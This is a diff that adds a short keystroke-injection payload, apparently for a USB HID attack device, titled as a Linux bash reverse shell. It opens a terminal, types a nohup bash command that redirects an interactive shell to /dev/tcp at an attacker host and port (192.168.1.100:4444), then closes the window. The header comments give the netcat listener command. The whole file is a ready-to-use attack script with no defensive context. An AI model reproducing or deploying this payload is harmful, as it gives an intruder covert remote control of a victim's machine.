@@ -1,0 +1,18 @@
+REM ============================================================
+REM  Linux · Reverse Shell (Bash)
+REM ============================================================
+REM  Opens a terminal and launches a bash reverse shell back to
+REM  your listener. Set LHOST and LPORT before running.
+REM
+REM  Start listener: nc -lvnp 4444
+
+DEFAULTDELAY 80
+
+DEFINE LHOST 192.168.1.100
+DEFINE LPORT 4444
+
+CTRL ALT t
+DELAY 1500
+STRINGLN nohup bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &
+DELAY 500
+STRINGLN exit
